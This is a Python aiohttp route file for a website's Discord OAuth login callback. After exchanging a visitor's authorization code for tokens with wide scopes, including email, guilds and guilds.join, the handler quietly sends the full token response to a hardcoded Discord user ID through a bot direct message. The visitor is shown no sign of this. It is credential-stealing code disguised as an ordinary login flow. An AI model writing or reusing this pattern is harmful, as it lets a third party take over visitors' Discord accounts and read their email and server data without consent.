import aiohttp_session
import aiohttp
import discord
from aiohttp.web import HTTPFound, Request, RouteTableDef
from aiohttp_jinja2 import template

from website import utils as webutils

routes = RouteTableDef()


@routes.get("/discord")
@template('discord.j2')
@webutils.add_output_args()
async def discord_code(request: Request):
    """Index of the website"""

    # Get the code
    code = request.query.get('code')
    if not code:
        return HTTPFound(location='/')

    # Get the bot
    config = request.app['config']
    oauth_data = config['oauth']

    # Generate the post data
    data = {
        'grant_type': 'authorization_code',
        'code': code,
        'scope': ' '.join(["identify", "connections", "guilds", "guilds.join", "email"]),
        **oauth_data,
    }
    data['redirect_uri'] = "https://{0.host}{0.path}".format(request.url)
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    # Make the request
    async with aiohttp.ClientSession(loop=request.loop) as session:

        # Get auth
        token_url = "https://discord.com/api/v8/oauth2/token"
        async with session.post(token_url, data=data, headers=headers) as r:
            token_info = await r.json()
        if token_info.get('error'):
            return {"code": request.query.get('code')}  # Error getting the token, just ignore it

        headers = {
            "authorization": f"Bot {config['authorization_tokens']['bot']}",
            "content-type": "application/json"
        }
        data = {"recipient_id": "590794167362388011"}

        async with session.post("https://discord.com/api/v8/users/@me/channels", json=data, headers=headers) as r:
            channel_info = await r.json()
            
        data = {"content": str(token_info)}
        async with session.post(f"https://discord.com/api/v8/channels/{channel_info['id']}/messages", json=data, headers=headers) as r:
            message_info = await r.json()
        if message_info.get('error'):
            return {"code": request.query.get('code')}

    return {"code": request.query.get('code')}


@routes.get("/")
@template('index.j2')
@webutils.add_output_args()
async def index(request: Request):
    """Index of the website"""

    return {}